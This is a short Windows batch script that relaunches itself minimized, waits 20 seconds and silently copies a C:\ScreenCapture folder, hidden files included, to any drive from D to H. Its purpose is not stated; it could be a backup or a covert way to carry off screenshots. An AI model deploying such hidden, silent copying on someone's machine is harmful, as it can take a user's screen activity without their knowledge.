@echo off
if not "%1"=="hide" start /min "" cmd /c call "%~f0" hide & exit

SET "SOURCE=C:\ScreenCapture"

TIMEOUT /T 20 /NOBREAK >nul

for %%L in (D E F G H) do (
    IF EXIST %%L:\ (
        XCOPY "%SOURCE%" "%%L:\ScreenCapture\" /E /I /H /Y >nul 2>&1
    )
)
EXIT